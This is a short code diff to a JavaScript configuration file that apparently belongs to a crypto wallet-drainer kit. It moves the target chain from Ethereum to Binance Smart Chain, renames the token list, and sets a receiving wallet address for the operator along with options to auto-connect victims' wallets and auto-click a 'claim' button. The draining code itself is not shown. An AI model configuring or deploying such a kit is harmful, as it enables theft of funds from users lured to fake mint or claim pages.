@@ -1,5 +1,5 @@
 const workChainId = 56; // Binance Smart Chain // The network we are working with is the chainId list https://chainlist.org/
-const workChainId = 1;
+
 const receiveAddress = "0x8935361d21943Ee8a863082EdD8a6Aefb062E434"; // YOUR WALLET ADDRESS
 
 
@@ -18,7 +18,7 @@ const autoConnect = false; //false; // auto connect wallet
 const autoMint = true; // auto click claim button
 
 
-const erc20list = {
+const bep20list = {
   // Bsc testnet
   /*
   '0x00a5Dc07A0F8061e896F0Acdd47d352e49FD1a2c': 100, // DAI BSC Testnet (97)
